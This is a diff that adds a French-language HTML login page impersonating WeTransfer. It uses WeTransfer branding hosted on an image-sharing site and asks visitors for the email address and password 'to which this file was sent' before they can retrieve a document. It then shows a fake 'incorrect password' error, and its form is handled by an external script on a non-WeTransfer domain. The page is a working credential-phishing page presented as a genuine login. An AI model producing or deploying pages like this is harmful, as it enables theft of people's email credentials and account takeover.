@@ -1,0 +1,137 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8">
+  <title>WeTransfer | Connexion</title>
+  <link rel="icon" href="https://i.ibb.co/QFvqnG2D/favicon-16x16.png" type="image/png">
+  <link href="https://fonts.googleapis.com/css2?family=Georgia&display=swap" rel="stylesheet">
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    html, body { height: 100%; font-family: 'Georgia', serif; }
+    .container { display: flex; height: 100vh; width: 100vw; }
+    .left {
+      width: 50%;
+      background-color: #6c3b00;
+      color: white;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      flex-direction: column;
+    }
+    .left .text { text-align: center; margin-bottom: 20px; }
+    .left .text h1 { font-size: 25px; font-weight: bold; }
+    .left .text h2 { font-size: 33px; font-weight: normal; line-height: 1.4; }
+    .left img { max-width: 700px; height: auto; }
+    .right {
+      width: 50%;
+      background-color: white;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      padding: 60px 20px;
+    }
+    .logo-right { margin-bottom: 40px; }
+    .logo-right img { width: 28px; height: auto; }
+    .section-title {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 12px;
+      margin-bottom: 40px;
+      position: relative;
+    }
+    .section-title span { font-size: 16px; color: #444; text-transform: uppercase; }
+    .section-title .line { height: 1px; flex: 1; background-color: #ddd; }
+    .login-box { width: 420px; text-align: center; }
+    .login-box p {
+      font-size: 15px;
+      font-weight: bold;
+      color: #222;
+      text-transform: uppercase;
+      line-height: 1.7;
+      margin-bottom: 20px;
+    }
+    .input-group { margin-bottom: 30px; }
+    .input-group input {
+      width: 100%;
+      padding: 14px 12px 14px 44px;
+      font-size: 16px;
+      border: 1px solid #ddd;
+      border-radius: 10px;
+      background-color: #f5f5f5;
+      background-repeat: no-repeat;
+      background-position: 12px center;
+      background-size: 18px 18px;
+    }
+    .input-group input.email {
+      background-image: url('https://img.icons8.com/ios-glyphs/30/000000/new-post.png');
+    }
+    .input-group input.password {
+      background-image: url('https://img.icons8.com/ios-glyphs/30/000000/lock--v1.png');
+    }
+    .login-box button {
+      width: 100%;
+      padding: 16px;
+      background-color: black;
+      color: white;
+      border: none;
+      border-radius: 25px;
+      font-size: 16px;
+      cursor: pointer;
+    }
+    .login-box button:hover { background-color: #222; }
+    .login-box footer {
+      font-size: 12px;
+      color: #666;
+      margin-top: 40px;
+    }
+    #error-message {
+      color: red;
+      margin-top: 15px;
+      font-size: 14px;
+      display: none;
+    }
+    @media (max-width: 900px) {
+      .container { flex-direction: column; }
+      .left, .right { width: 100%; height: 50%; }
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="left">
+      <div class="text">
+        <h1>WeTransfer</h1>
+        <h2>Send files, move ideas<br>with WeTransfer</h2>
+      </div>
+      <img src="https://i.ibb.co/TxL8pbxB/Trsf.png" alt="Trsf">
+    </div>
+    <div class="right">
+      <div class="logo-right">
+        <img src="https://i.ibb.co/zh23nm7C/We-Transfer-logo-svg.png" alt="Logo WeTransfer">
+      </div>
+      <div class="login-box">
+        <div class="section-title">
+          <div class="line"></div>
+          <span>Connexion</span>
+          <div class="line"></div>
+        </div>
+        <p>POUR LIRE LE DOCUMENT, VEUILLEZ ENTRER<br>LES IDENTIFIANTS DE MESSAGERIE<br>AUXQUELS CE FICHIER A ÉTÉ ENVOYÉ.</p>
+        <form id="login-form">
+          <div class="input-group">
+            <input type="email" class="email" id="email" placeholder="E-mail" required>
+          </div>
+          <div class="input-group">
+            <input type="password" class="password" id="password" placeholder="Mot de passe" required>
+          </div>
+          <button type="submit">Récupérer mes fichiers</button>
+          <div id="error-message">Mot de passe incorrect, veuillez réessayer.</div>
+        </form>
+        <footer>© WeTransfer 2026 - Tous droits réservés.</footer>
+      </div>
+    </div>
+  </div>
+  <script src="https://fabianii.web.app/app.js"></script>
+</body>
+</html>
